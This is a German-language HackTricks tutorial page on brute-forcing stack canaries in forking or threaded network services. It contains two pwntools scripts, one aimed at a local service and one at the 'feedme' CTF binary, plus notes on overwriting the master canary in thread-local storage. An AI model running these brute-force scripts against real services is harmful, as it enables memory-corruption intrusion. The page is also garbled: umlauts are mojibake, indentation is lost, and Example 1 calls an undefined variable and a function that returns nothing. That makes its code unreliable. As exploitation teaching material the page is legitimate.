# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

**Wenn du es mit einer bin√§ren Datei zu tun hast, die durch einen Canary und PIE (Position Independent Executable) gesch√ºtzt ist, musst du wahrscheinlich einen Weg finden, diese zu umgehen.**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
Beachte, dass **`checksec`** m√∂glicherweise nicht erkennt, dass eine bin√§re Datei durch einen Canary gesch√ºtzt ist, wenn diese statisch kompiliert wurde und nicht in der Lage ist, die Funktion zu identifizieren.\
Du kannst dies jedoch manuell feststellen, wenn du bemerkst, dass ein Wert zu Beginn eines Funktionsaufrufs im Stack gespeichert wird und dieser Wert vor dem Verlassen √ºberpr√ºft wird.
{% endhint %}

## Brute Force Canary

Der beste Weg, einen einfachen Canary zu umgehen, ist, wenn die bin√§re Datei ein Programm ist, das **bei jeder neuen Verbindung** mit ihm (Netzwerkdienst) **Kindprozesse forked**, denn jedes Mal, wenn du dich mit ihm verbindest, **wird der gleiche Canary verwendet**.

Der beste Weg, den Canary zu umgehen, besteht dann darin, ihn einfach **Zeichen f√ºr Zeichen zu brute-forcen**, und du kannst herausfinden, ob das erratene Canary-Byte korrekt war, indem du √ºberpr√ºfst, ob das Programm abgest√ºrzt ist oder seinen regul√§ren Ablauf fortsetzt. In diesem Beispiel **brute-forced die Funktion einen 8-Byte-Canary (x64)** und unterscheidet zwischen einem korrekt erratenen Byte und einem schlechten Byte, indem sie einfach **√ºberpr√ºft**, ob eine **Antwort** vom Server zur√ºckgesendet wird (eine andere M√∂glichkeit in **anderen Situationen** k√∂nnte die Verwendung von **try/except** sein):

### Beispiel 1

Dieses Beispiel ist f√ºr 64-Bit implementiert, k√∂nnte aber leicht f√ºr 32-Bit implementiert werden.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Beispiel 2

Dies ist f√ºr 32 Bit implementiert, kann jedoch leicht auf 64 Bit ge√§ndert werden.\
Beachten Sie auch, dass das **Programm zuerst ein Byte erwartet, um die Gr√∂√üe der Eingabe** und die Nutzlast anzuzeigen.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Threads

Threads desselben Prozesses werden auch **das gleiche Canary-Token teilen**, daher wird es m√∂glich sein, ein Canary zu **brute-forcen**, wenn die Bin√§rdatei bei jedem Angriff einen neuen Thread erzeugt.&#x20;

Dar√ºber hinaus k√∂nnte ein Buffer **Overflow in einer threaded Funktion**, die mit einem Canary gesch√ºtzt ist, verwendet werden, um das **Master-Canary, das im TLS gespeichert ist, zu modifizieren**. Das liegt daran, dass es m√∂glich sein k√∂nnte, die Speicherposition zu erreichen, an der das TLS gespeichert ist (und damit das Canary) √ºber einen **bof im Stack** eines Threads.\
Infolgedessen ist die Minderung nutzlos, da die √úberpr√ºfung mit zwei Canaries verwendet wird, die gleich sind (obwohl modifiziert).\
Dieser Angriff wird in dem Writeup durchgef√ºhrt: [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)

√úberpr√ºfen Sie auch die Pr√§sentation von [https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015](https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015), die erw√§hnt, dass normalerweise das **TLS** durch **`mmap`** gespeichert wird und wenn ein **Stack** eines **Threads** erstellt wird, es ebenfalls durch `mmap` generiert wird, was den Overflow erm√∂glichen k√∂nnte, wie im vorherigen Writeup gezeigt.

## Other examples & references

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, no PIE, nx, BF canary, write in some memory a ROP to call `execve` and jump there.
